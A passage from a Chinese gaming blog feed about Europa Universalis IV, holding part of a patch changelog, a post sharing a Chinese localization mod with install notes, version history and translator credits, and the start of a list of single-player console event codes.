Burma area in the ‘Campaign in Burma’ mission for Qing in Domination<br>- Adjusted the mission ‘Campaign in Burma’ for Domination’s Qing, to require 25 provinces in Burma, instead of certain set areas<br>- Added Random New World triggers for 2 French missions<br>- The mission “A Realm of Chivalry” now requires 100k troops killed in total instead of 20k troops killed in a single battle.<br>- The Emperor of China mission Shengshi &amp; Zhishi now has simplified requirements and rewards<br>- The mission “Seize France’s Throne” now grants permanent claim on the areas of Britanny, Burgundy, Picardy, Lorraine, and Provence.<br>- Added dynamic province highlighting for the French mission ‘Indian Dominance’<br>- Added a new and improved version of the ‘Conduct Population Census’ to better reflect and display the +1 Monthly Administrative Power granted by the Reform Civil Registration mission of the Emperor of China.<br>- Added a new version of the Expand Palace Bureaucracy to better reflect its empowered version granted by the Cornerstone of an Empire mission<br>- Added alternative triggers for French colonial missions if Random New World is active<br>- The Angevin mission will no longer request you to discover Canada and this is already covered when you colonize North America.<br>- Added an easier to understand tooltip to the “Mainland Alliances” British mission.<br>- Fixed an issue that made it unclear that you can’t cheese the upgrade of your Centers of Trade in the Swedish mission tree.<br>- Added a sneaky missing bracket at the very end of the DOM_Spain_Missions file<br>- The Brandenburg mission ‘Construct the Kiel Canal’ now properly grants access to the Canal even before Tech 22 and grants a supplementary bonus to your treasury<br>- Fixed a trigger for a Revolutionary France mission<br>- Added the Toulon Dockyard modifier to the correct province, for the Aragonese mission.<br>- Fixed an issue that fired the failure event for the conquest of Franconia for Domination’s Brandenburg mission<br>- Fixed an error that prevented the Japanese Divine Empire from being granted<br>- Daimyo missions now have alternative requirements other than “Is Japan” to allow Domination players to complete the mission tree before forming Japan.<br>- The Spanish mission ‘New Capital’ no longer highlights every single capital everywhere.<br>- The Mission ‘Holy See Politics’ now properly scopes to the capital of the Papal States.<br>- The modifier “Religious Stability” from the English mission “Piety of the State” now increases Tolerance of true faith by 0.5 and Yearly Patriarch Authority by +0.5.<br>- The Russian mission “Break the Tatar Yoke” has now a secondary condition that allows you to get rid of the Tatar Yoke modifier if you have 85% Warscore.<br>- Fixed an issue with the Angevin mission “Settle in America” which tells you to colonize Canada instead of colonizing the New World.<br>- Fixed an error that prevented ‘A New Buddha’ from granting a new mission for people without other DLCs other than Domination.<br>- Fixed a wrong scope in the Fortify the Coast mission for Chinese minors, Qing and Ming.<br>- Adjusted the displayed tooltip reward for the Toulon mission of France, to reflect the actual reward granted<br>- Reordered the triggers for the ‘Kingdoms of Spain’ for better visibility and fixed an error associated with its reward<br>- Added a missing claim for Malacca in the Portuguese missions<br>- The modifier ‘Reformed Haijin Policy’ now has a proper modifier scoped to the country level<br>- Added a missing claim for the Majeerteen area in the proper mission reward<br>- The Shinto Warriors modifier now grants 0.5 flat Land Morale instead of 0.1<br>- The Portuguese mission “The Cape of Good Hope” now grants a claim on Zanzibar<br>- Fixed an error that gave breakaway Chinese warlords 100 Monarch points instead of 150 in their Independence mission<br>- Removed the positive gain of inflation from the modifier “Silver House of China” granted by the Single Whip Law mission<br>- Fixed an issue between the Occitania and Provence missions for Aragon<br>- Fixed an issue that prevent Qing from completing the “Dominate the Jurchen Tribes” missions due to the latter requiring “Be Manchu”<br>- Fixed an issue that prevented some based game Qing missions from appearing without Domination<br>- Reduced the refunding of corruption granted by the “The Eight Banners” mission available to Jurchen tribes, Manchu, and Qing<br>- Provence will now always accept the subjugation offer by France in “Provençal Question” however they will not be instantly integrated by the “A House United” special mission reward.<br>- Swapped the icons of ‘Fecho del Imperio’ and ‘Universal Monarchy’ for consistency’s sake<br>- Readded the mission “Prepare Reconquista” for Castile, so they can have claims to Granada again<br>- Fixed an issue regarding Golden Century Castilian missions appearing in the wrong place</p><p># Modifiers<br>- The Single Whip Law privilege now offers a lot more national tax and a lot less increased inflation to make it more appealing<br>- Replaced both instances of flat land morale for Japan and Portugal with percentage ones</p><p># Setup<br>- Fixed an error that allowed the estate privilege “Factionalist Nobility” to be momentarily visible for Castile even without the Domination DLC<br>- Fixed a missing national idea for Orleans<br>- Adjusted the Banners-related Celestial reform. It now requires 15% Cavalry Combat Ability OR 25 Banners and grants 10% Ratio instead of 50% as well as 5% Cavalry Combat Ability<br>- Fixed an issue that prevented the Struggle for Royal Power from firing for the players who do not own Lions of the North</p><p># Other<br>- Changed the icon for “Control over Monetary Policy” so it no longer gets confused with “Indebted to the Burghers”.<br>- The decadence bar now also mentions that it in- and decreases by stability.<br>- The Decadence description now mentions that the ruler’s victories and defeats decrease and increase Decadence.<br>- The privileges regarding liberating or enserfing the peasants will now block government reforms which would remove the Nobles or Burghers estate.<br>- All countries which can get their name or color changed have now proper access to decisions that allow them to restore their original color and name. Former Eyalets will now also restore their original names and color.<br>- Fixed an issue with the Tier 5 Tercios Government reform being instantly abolished but remaining available.<br>- The Expanded Black Army reform is now correctly registered in tier 5.<br>- The event “The Franco-Ottoman Alliance” can no longer trigger when France and the Ottomans are at war with each other.<br>- Fixed a wrong scope for the Emperor of China for Chinese Warlord missions<br>- Fixed the Spanish localization of a few missions.<br>- Estate Privilege ‘Support the Brahmins’ now is only available to Muslim countries.<br>- Fixed a tooltip error with the mission ‘Wine Monopolies’.<br>- Fixed some issues with the German localization.<br>- Improved the descriptions of some estate privileges.<br>- The Franciscan order now grants base production instead of base manpower<br>- Fixed one of the canals having the wrong development cost reduction<br>- The event “The Franco-Ottoman Alliance” can no longer trigger when France and the Ottomans are at war with each other.<br>- Fixed a wrong scope for the Emperor of China for Chinese Warlord missions<br>- Forming Siam through the decision now requires Administrative Technology 20.</p><p>###################<br># Bugfixes<br>###################<br>- Fixed null subject type crash<br>- Fixed no federal constitution advancement crash<br>- Fixed crash not finding GUI for a dialog<br>- Fixed issue with GOG Windows build not shutting down when restarting at the exit to the main menu.<br>- Russia can no longer have 5 different variations of serfdom active at the same time.<br>- Removed confusing triggers for the Plot of the Harem disaster.<br>- The estate agenda “Expand Port Infrastructure” is now properly auto-completed by the Burgher’s privilege action instead of the one of the Clergy.<br>- Damarwulan has enough of his imposters. Fake Damarwulans will no longer count in won battles for the Damarwulan event.<br>- Buying subject upgrades for your colonies will no longer grant you admin power instead of costing it.<br>- Fixed an oversight that would have allowed the Mamluks to integrate way too large vassals when they get turned into an Eyalet by the Ottomans.<br>- Fixed a missing localization for the trigger “has_unembraced_institution”<br>- Fixed a bug where under rare DLC circumstances you would see your ability to form Trade Leagues and Trade Cities twice as a Veche Republic.<br>- Fixed a bug where the Russian Empire (and its Republican equivalent) would only give 0.05 Yearly Absolutism instead of 0.5 Yearly Absolutism.<br>- It is no longer possible as Russia to have your peasants be enserfed and liberated at the same time.<br>- Building and destroying farming estates will no longer increase your development under rare conditions. The “Expand the Fortifications” modifier is now properly removed from a province with a level 2 fort if said fort gets destroyed.<br>- The mission reward for the Ottoman mission “The Cradle of Civilization” lasts now for 30 years instead of 29 years and 265 days.<br>- Fixed a bug that prevented Anglois countries to benefit from Stonehenge.<br>- Fixed a bug where the Gokaido Reform and the Reform the Samuari government reforms would not show up in Japanese countries.<br>- Fixed the Decadence jumps from winning or losing battles with your monarch.<br>- Renamed the second add_stability_or_adm_power to add_stability_or_adm_power_per_stab to avoid overloading a single scripted effect.<br>- Removed an unnecessary base_monthly_growht from the Mercenary militarization.<br>- Removed the secondary_religion_group scripted trigger as it is no longer needed.<br>- Removed an unnecessary made_monthly_growht from the Mercenary militarization.<br>- The Order of Avis can now be established when you accept the Portuguese culture.<br>- Fixed a display error that showed Russia paying nothing for modernization ideas.<br>- Fixed an issue where Monthly Innovativeness gain was colored in red even if the gain was positive.<br>- The parliament issue “Fund an Industrial Project” now actually constructs a manufactory in the province.<br>- The parliament issue “Acts of Representation” now properly reduces the liberty desire of your subjects instead of your own.<br>- Fixed an issue where the rewards were swapped for the mission “The Asian Trade” for Novgorod-Russia.<br>- The Russian Rule ability no longer resets completely to 0 for the diplomatic and military abilities when a new ruler comes to power.<br>- Forming England and following the Angevin Path will no longer allow you to complete the mission “The Angevin Kingdom” twice.<br>- Fixed a missing localization for the trigger “has_unembraced_institution”<br>- Fixed some minor localization issues.<br>- Fixed the missing diplomatic action which allows you to call Trade Protectorates into your wars as advertised.<br>- Mission or event effects which distribute Development for provinces of a certain area do this now the defined amount of times. In other words: Missions like “Establish the Pashas” for the Ottomans now give properly 10 development instead of randomly giving more or less.<br>- The event “Competition with Nobility” now reduces properly the influence of the Janissaries if you pick the third option.<br>- Events for Russia and England &#x2F; GB which define a new heir or ruler now check that the country is not a junior partner in a personal union.<br>- Elective Monarchies can no longer trigger the event for the Imperial Authority to gain twice should they be re-elected as the Emperor.</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 更新日志 </tag>
            
            <tag> P社 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【欧陆风云4】简体中文汉化包 ，支持1.35.3</title>
      <link href="/1806.html"/>
      <url>/1806.html</url>
      
        <content type="html"><![CDATA[<p>欢迎大家收藏本文章，本文会随MOD更新而更新</p><h2 id="汉化截图"><a href="#汉化截图" class="headerlink" title="汉化截图"></a>汉化截图</h2><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-1024x569.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-1-1024x569.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-2-1024x569.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-3-1024x569.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-4-1024x569.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-5-1024x569.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a><strong>使用方法</strong></h2><p>可以参考原先我发的这篇文章：<a href="https://blog.gjcloak.top/52.html">欧陆风云4汉化mod安装教程</a></p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><strong>常见问题</strong></h2><ul><li>海外省份名称缺字<br>用记事本打开游戏目录中 plugins&#x2F;plugin.ini 文件<br>将其中 <strong>SEPARATE_CHARACTER_CODE_POINT&#x3D;38936</strong> 改为 <strong>SEPARATE_CHARACTER_CODE_POINT&#x3D;32</strong><br>这里的数字是 unicode 字符编号，如果你想改成其他的字，可以自己查表，32为原版默认的空格</li><li>打了补丁游戏闪退<br>确认你是按照上面的使用方法一节的说明进行的，完成后游戏目录中应该有 eu4.exe、plugins文件夹、d3d9.dll及version.dll，缺一不可。</li><li>点阶层闪退<br>删除所有旧版mod文件后重新下载覆盖。</li></ul><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><a class="btn-anzhiyu larger" href="https://cdn.gjcloak.xyz/cloudreve/1/2023/05/09/1_20230509162422_eu4_1.35.2_chinese_v3.9.2.7z"   title="汉化文件1.35.2"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>汉化文件1.35.2</span></a><a class="btn-anzhiyu larger" href="https://cdn.gjcloak.xyz/cloudreve/1/2023/05/15/1_20230515101634_eu4_1.35.3_chinese_v3.9.3.7z"   title="汉化文件1.35.3"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>汉化文件1.35.3</span></a><p><a href="https://steamcommunity.com/sharedfiles/filedetails/?id=2976470733">Steam 创意工坊::Chinese Language Mod for 1.35 (steamcommunity.com)</a></p><details class="folding-tag" ><summary> 更新日志 </summary>              <div class='content'>              <p>v3.9.3（2023&#x2F;05&#x2F;12）  </p><ul><li>修复战争概览界面UI问题  </li><li>更新文本</li></ul><p>v3.9.2（2023&#x2F;05&#x2F;06）  </p><ul><li>增加 1.35.2 支持</li></ul><p>v3.9.1（2023&#x2F;04&#x2F;28）  </p><ul><li>更新文本  </li><li>修复政府界面UI问题</li></ul><p>v3.9.0（2023&#x2F;04&#x2F;24）  </p><ul><li>增加 1.35.1 支持</li></ul><p>v3.8.2（2022&#x2F;10&#x2F;19）  </p><ul><li>更新文本</li></ul><p>v3.8.1（2022&#x2F;09&#x2F;23）  </p><ul><li>更新文本</li></ul><p>v3.8.0（2022&#x2F;09&#x2F;19）  </p><ul><li>增加 1.34.2 支持</li></ul><p>v3.7.1（2022&#x2F;03&#x2F;29）  </p><ul><li>更新文本  </li><li>删除补充包中多余文件以修复部分事件触发问题</li></ul><p>v3.7.0（2022&#x2F;03&#x2F;04）  </p><ul><li>增加 1.33.2 支持</li></ul><p>v3.6.3（2022&#x2F;02&#x2F;17）  </p><ul><li>更新文本</li></ul><p>v3.6.2（2021&#x2F;12&#x2F;11）  </p><ul><li>修复裂颅事件无法触发的问题，感谢斯坎德培（Juzeliu）的反馈  </li><li>更新文本</li></ul><p>v3.6.1（2021&#x2F;11&#x2F;18）  </p><ul><li>修复UI问题  </li><li>更新文本</li></ul><p>v3.6.0（2021&#x2F;11&#x2F;16）  </p><ul><li>增加 1.32.1 支持  </li><li>更新双字节补丁</li></ul><p>v3.5.5（2021&#x2F;08&#x2F;22）  </p><ul><li>更新文本</li></ul><p>v3.5.4（2021&#x2F;07&#x2F;14）  </p><ul><li>增加 1.31.5 支持  </li><li>更新双字节补丁</li></ul><p>v3.5.3（2021&#x2F;06&#x2F;05）  </p><ul><li>更新文本  </li><li>更新双字节补丁</li></ul><p>v3.5.2（2021&#x2F;05&#x2F;10）  </p><ul><li>修复外交界面UI问题  </li><li>更新文本</li></ul><p>v3.5.1（2021&#x2F;05&#x2F;02）  </p><ul><li>修复UI文件错误导致闪退的问题</li></ul><p>v3.5.0（2021&#x2F;05&#x2F;02）  </p><ul><li>增加 1.31.1 支持  </li><li>更新双字节补丁</li></ul><p>v3.4.12 (2021&#x2F;04&#x2F;26)  </p><ul><li>针对反馈的字体模糊问题再次重做字体；恢复12号字<br>新老字体效果对比<br>老 <a href="https://ftp.bmp.ovh/imgs/2021/04/db1359712ab66859.png">https://ftp.bmp.ovh/imgs/2021/04/db1359712ab66859.png</a><br>新 <a href="https://ftp.bmp.ovh/imgs/2021/04/7a71101758468785.png">https://ftp.bmp.ovh/imgs/2021/04/7a71101758468785.png</a>  </li><li>更新文本</li></ul><p>v3.4.11 (2021&#x2F;04&#x2F;24)  </p><ul><li>重做字体，现已可显示GBK字符集内大部分字符（不包括地图字体）；删除12号字体及未使用到的点阵宋体，全部合并使用14号字体  </li><li>修复莫卧儿文化界面有时百分比显示换行的问题  </li><li>更新文本</li></ul><p>v3.4.10 (2021&#x2F;03&#x2F;30)  </p><ul><li>修复阶层界面问题（感谢yuqwq的反馈）  </li><li>更新文本</li></ul><p>v3.4.9 (2021&#x2F;03&#x2F;24)  </p><ul><li>更新文本  </li><li>更新双字节补丁</li></ul><p>v3.4.8 (2021&#x2F;02&#x2F;18)  </p><ul><li>更新文本</li></ul><p>v3.4.7 (2020&#x2F;11&#x2F;28)  </p><ul><li>更新文本</li></ul><p>v3.4.6 (2020&#x2F;09&#x2F;25)  </p><ul><li>更新文本</li></ul><p>v3.4.5 fix (2020&#x2F;08&#x2F;15)  </p><ul><li>修复无限弹事件的问题  </li><li>修复.mod配置文件中路径设置  </li><li>更新文本</li></ul><p>v3.4.5（此版本有重大BUG，已废弃） (2020&#x2F;08&#x2F;13)  </p><ul><li>更新文本</li></ul><p>v3.4.4 (2020&#x2F;07&#x2F;02)  </p><ul><li>修复拉芬斯堡省份名称问题（感谢lhyb17的反馈）  </li><li>更新文本</li></ul><p>v3.4.3 (2020&#x2F;07&#x2F;02)  </p><ul><li>修复勃兰登堡事件flavor_brapru.22触发（感谢MNAKGRAoZora的反馈）  </li><li>修复奥匈联统事件触发（感谢yuhan1993的反馈）  </li><li>更新文本</li></ul><p>v3.4.2 (2020&#x2F;06&#x2F;24)  </p><ul><li>更新大量文本  </li><li>更新双字节补丁</li></ul><p>v3.4.1 (2020&#x2F;06&#x2F;18)  </p><ul><li>修复雇佣兵界面将军属性显示  </li><li>更新文本</li></ul><p>v3.4.0 (2020&#x2F;06&#x2F;17)  </p><ul><li>增加 1.30.2 支持  </li><li>更新双字节补丁</li></ul><p>v3.3.2 (2020&#x2F;05&#x2F;19)  </p><ul><li>修复.mod文件中路径写法  </li><li>更新文本</li></ul><p>v3.3.1 (2020&#x2F;04&#x2F;29)  </p><ul><li>修复兼容版本号显示问题  </li><li>更新文本</li></ul><p>v3.3.0 (2020&#x2F;04&#x2F;24)  </p><ul><li>增加1.29.6支持（此游戏版本文本未发生任何变化，仅对已有翻译进行了优化）  </li><li>更新双字节补丁</li></ul><p>v3.2.0 (2020&#x2F;02&#x2F;16)  </p><ul><li>增加 1.29 支持  </li><li>优化省份及附庸界面文本显示问题</li></ul><p>v3.1.6 (2019&#x2F;08&#x2F;17)  </p><ul><li>更新文本</li></ul><p>v3.1.5 (2019&#x2F;06&#x2F;29)  </p><ul><li>更新文本</li></ul><p>v3.1.4 (2019&#x2F;04&#x2F;20)  </p><ul><li><p>更新文本</p></li><li><p>更新文本 (2019&#x2F;03&#x2F;27]v3.1.3)  </p></li><li><p>优化控制台字体</p></li><li><p>修复统治者界面年龄显示问题 (2019&#x2F;03&#x2F;09]v3.1.2)  </p></li><li><p>修复直辖省份面板中未翻译的文本（以上两条感谢@lpc225的反馈）  </p></li><li><p>微调叛军镇压面板布局  </p></li><li><p>更新文本</p></li></ul><p>v3.1.1 (2019&#x2F;02&#x2F;27)  </p><ul><li>修复外交威望部分情况不显示数值的问题  </li><li>修复一条文本问题  </li><li>更新翻译</li></ul><p>v3.1.0 (2019&#x2F;02&#x2F;19)  </p><ul><li>增加 1.28.3 支持  </li><li>增加省会名称汉化（感谢 remixMe 及其他小伙伴的帮助）  </li><li>更新双字节补丁</li></ul><p>v3.0.6 (2019&#x2F;01&#x2F;26)  </p><ul><li>更新文本</li></ul><p>v3.0.5 (2019&#x2F;01&#x2F;12)  </p><ul><li>更新文本</li></ul><p>v3.0.4 (2018&#x2F;12&#x2F;26)  </p><ul><li>修复省份界面直属州选项卡直属州名称显示问题（感谢 @Naiver 的反馈）</li></ul><p>v3.0.3 (2018&#x2F;12&#x2F;25)  </p><ul><li>继续修复部分 UI 问题，感谢 @pb7410 的反馈</li></ul><p>v3.0.2 (2018&#x2F;12&#x2F;23)  </p><ul><li>修复部分 UI 问题</li></ul><p>v3.0.1 (2018&#x2F;12&#x2F;22)  </p><ul><li>修复特殊国家开局介绍  </li><li>修复mod名称</li></ul>              </div>            </details><p>如果你在游戏中遇到汉化相关的问题，可前往平台项目创建讨论<br>注意提交问题时请附上相关截图或定位到的文件，方便汉化组成员定位问题。<br><a href="https://paratranz.cn/projects/2/issues">点此前往讨论</a></p><details class="folding-tag" ><summary> 1.30 汉化成员 </summary>              <div class='content'>              <p>负责人(1)<br>bruceCzK(机智的布鲁斯)</p><p>管理(3)<br>LazyNerd233(懒惰的胖鲁斯) momenttensor ShekPS(Shek)</p><p>校对(17)<br>Buernia(奈白不弍) Buyi-wsgzg chzhy38(阿拉姆吉尔) Cinque05(Cinque) freedfox<br>guoguo7044(果果) hbhxmf LALULASE Linthereeder lkha3 Lswrfgn(诺盖)<br>pokewiz STAR-FWX(D-X血魔受) voiotikos WhiverFichos xpipi001 zhmou</p><p>翻译(62)<br>105468508(无产阶级种水稻) 154775316 58185599 68star89(星辰) a129312931293<br>a231i01(李勋回来了) allenx555 Andrew-Kang7704(krt770486) ataraxia2020<br>baoyunkexi BenjaminPMLovegood(AARKEGZ) bigblues BigColander(纳瓦拉的亨利)<br>bobqq1301(bob1301) CattyCookie(von Keksburg) Constantinoass CrossbellState(克洛斯贝尔)<br>Danielkyoko(一般通过杏子) DanielZHPY esz5006(saki怜) eu4myg(eu4myg) grandsaltyfish<br>GulielmusM Gulzar2000(Gulzar) hyn990422(RakiNO7) idylle7(江星辰)<br>IRIDIUM-SUB(POTASSIUM) jlxzl(Duke) Jml-bot(MerlinChang) JonathanH17<br>JTRyy JumpingHussar Kalevalar(卡勒瓦拉) kircheis1999(AK) KUKGO(GUKGO)<br>Kuon-uta(Kuon-uta) lishenramsey lizkes ljingqi(苏司栋) lll1120 longyoujiuzhou(龙游)<br>lurunlin(Houge) Michaelmas1119 MMNDD1(白马) notsofun(南东筱) orange-bike<br>punkmor qawedr112(无名的政委) qq1922857293(三生烟火乱年华) Quintensence(elecalex)<br>RetardDong(烟波Van) Rinboyan(Rin) s12345n678 sasisuseso ShyBeeLei(知石)<br>srtfd tanukihee The-Username-Not-Taken(The Username Not Taken)<br>TML17(我也不会) UshioOs(Ushio) Wei-Roman zzj680124</p>              </div>            </details><details class="folding-tag" ><summary> 1.31 汉化成员 </summary>              <div class='content'>              <p>负责人(1)<br>bruceCzK(机智的布鲁斯)</p><p>管理(2)<br>ShekPS(Shek) momenttensor</p><p>校对(8)<br>Buernia(奈白不弍) BigColander(纳瓦拉的亨利) Gulzar2000(Gulzar) voiotikos<br>wshdzw(失忆的黄鲁斯) zhmou Cinque05(Cinque) Buyi-wsgzg</p><p>翻译(32)<br>Bl-XY(噬星鸽) Jackyzhu6 MMNDD1(白马) CattyCookie(von Keksburg) yinzhang1017(樱葬1017)<br>sylvesterlali RyoMaX99(HosiKuzu_X99) longyoujiuzhou(龙游) Katyusha233(Katyusha233)<br>allenx555 JumpingHussar Jml-bot(MerlinChang) Constantinoass UshioOs(Oscuro)<br>Surveillance-qwq(安度因缘) StephenZhoumd zzj680124 starry-cccccjj<br>Rinboyan(Rin) 105468508(无产阶级种水稻) GulielmusM modao1234 Forever4Q<br>bobqq1301(bob1301) OniyuriZYH(芜湖起飞) fatethief qawedr112(无名的政委)<br>58185599 DanielZHPY(Pisciprehender) qq1922857293(三生烟火乱年华) sasisuseso<br>Mr-Rokossovsky</p>              </div>            </details><details class="folding-tag" ><summary> 1.32 汉化成员 </summary>              <div class='content'>              <p>负责人(1)<br>bruceCzK(机智的布鲁斯)</p><p>管理(1)<br>ShekPS(Shek)</p><p>校对(10)<br>BigColander(纳瓦拉的亨利) Buernia(奈白不弍) Buyi-wsgzg Cinque05(Cinque)<br>Gulzar2000(Gulzar) STAR-FWX(D-X血魔受) freedfox voiotikos wshdzw(失忆的黄鲁斯)<br>xpipi001</p><p>翻译(24)<br>105468508(无产阶级种水稻) 58185599 Bl-XY(噬星鸽) CattyCookie(Keksburg) JumpingHussar<br>KUKGO(GUKGO) Kalevalar(卡勒瓦拉) Katyusha233(Katyusha233) MarcusDaskalos<br>OniyuriZYH(冻手冻手) Quintensence(elecalex) Rayforward RyoMaX99(HosiKuzu_X99)<br>Unknown7704(Unknown) UshioOs(Oscuro) allenx555 bobqq1301(bob1301)<br>imfelixlaw kaleido1997 qawedr112(无名的政委) qq1922857293(三生烟火乱年华)<br>s12345n678 sasisuseso sylvesterlali</p>              </div>            </details><details class="folding-tag" ><summary> 1.33 汉化成员 </summary>              <div class='content'>              <p>管理(1)<br>ShekPS(Shek)</p><p>校对(9)<br>Buyi-wsgzg zhmou voiotikos WhiverFichos Gulzar2000(Gulzar) Buernia(奈白不弍)<br>CattyCookie(Keksburg) BigColander(纳瓦拉的亨利) kaleido1997</p><p>翻译(6)<br>allenx555 bobqq1301(bob1301) JumpingHussar RyoMaX99(HosiKuzu_X99)<br>AshleyTranny(阿什莉) lkha3</p>              </div>            </details><details class="folding-tag" ><summary> 1.34 汉化成员 </summary>              <div class='content'>              <p>管理(2)<br>momenttensor(精二纯一) ShekPS(Shek)</p><p>校对(15)<br>CattyCookie(猫饼堡) BigColander(纳瓦拉的亨利) Buernia(奈白不弍) Buyi-wsgzg<br>Puzzlesam Gulzar2000(Gulzar) kaleido1997 hbhxmf(hbhazp) wshdzw(失忆的黄鲁斯)<br>WhiverFichos Cinque05(Cinque) zhmou voiotikos Michaelmas1119(米哈端午)<br>xpipi001</p><p>翻译(21)<br>MMNDD1(白马) yinzhang1017(樱葬1017) Katyusha233(Katyusha233) sylvesterlali<br>JumpingHussar bobqq1301(bob1301) Constantinoass allenx555 JTRyy<br>Quintensence(elecalex) zzj680124 it-tttt(星屑) StephenZhoumd starry-cccccjj<br>Z-Puyu(Pisciprehender) AshleyOwO(阿什莉) s12345n678 GulielmusM lkha3<br>Jml-bot(MerlinChang) qawedr112(无名的政委)</p>              </div>            </details><details class="folding-tag" ><summary> 1.35 汉化成员 </summary>              <div class='content'>              <p>管理(2)<br>ShekPS(Shek) momenttensor(精二纯一)</p><p>校对(20)<br>AshleyOwO(阿什莉) BigColander(纳瓦拉的亨利) Buernia(奈白不弍) Buyi-wsgzg CattyCookie(猫饼堡)<br>Cinque05(Cinque) Gulzar2000(Gulzar) MMNDD1(白马) Michaelmas1119(米哈端午)<br>Puzzlesam WhiverFichos freedfox hbhxmf(hbhazp) kaleido1997 qwsdfvbnm<br>voiotikos wshdzw(失忆的黄鲁斯) xpipi001 yinzhang1017(樱葬1017) zhmou</p><p>翻译(25)<br>105468508(无产阶级种水稻) Constantinoass JTRyy Jackyzhu6 Jml-bot(MerlinChang)<br>JumpingHussar Katyusha233(Katyusha233) LoganGeng(四海无人对夕阳) MarcusDaskalos(Aww)<br>Q8yMDDR Quintensence(elecalex) Rayforward Tbeabm UshioOs(Oscuro)<br>ZhuGeKongBo a231i01(李勋回来了) allenx555 bobqq1301(bob1301) lkha3<br>longyoujiuzhou(龙游) qawedr112(无名的政委) qq1922857293(三生烟火乱年华) starry-cccccjj<br>sylvesterlali zzj680124(0v0)</p>              </div>            </details><p>（PS：查看原文点击<a href="https://bbs.52pcgame.net/thread-206410-1-1.html">这里</a>）</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 分享 </tag>
            
            <tag> mod </tag>
            
            <tag> P社 </tag>
            
            <tag> 汉化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【EU4】自用强力修正事件分享</title>
      <link href="/1711.html"/>
      <url>/1711.html</url>
      
        <content type="html"><![CDATA[<p>使用方法也很简单，**~<strong>开启控制台，输入【</strong>event+空格+事件代码<strong>】即可<br>·使用时请注意事件具体描述以规避带有</strong>负面效果<strong>的选项，已在文本中注明了部分<br>·</strong>欢迎补充，看到了会添加到文章中并标注您的信息**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">emp_mission_events.5        「罗马」帝国        年度正统+1</span><br><span class="line">  9075        重建罗马人的帝国        无需多言</span><br><span class="line">  flavor_hab.20        改革奥地利帝国君主制?        获得一级改革奥地利帝国君主制\可接受文化+2        全国叛乱-2 可接受文化+2 君主外交+2 认同文化花费-33</span><br><span class="line">  flavor_han.1        莱布尼茨        获得放下鼠标做十道微积分练习题的权利  </span><br><span class="line"></span><br><span class="line">  flavor_eng.99        穿衬裙的士兵        可能顾问+1 女性顾问概率+25 允许招募女将领</span><br><span class="line">  flavor_orl.11        圣贞德骑士团        政体转神权 女性顾问概率+100 训练度+5 正统容忍+1 异端容忍-3 可征召女性将领 陆军火力伤害+10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span 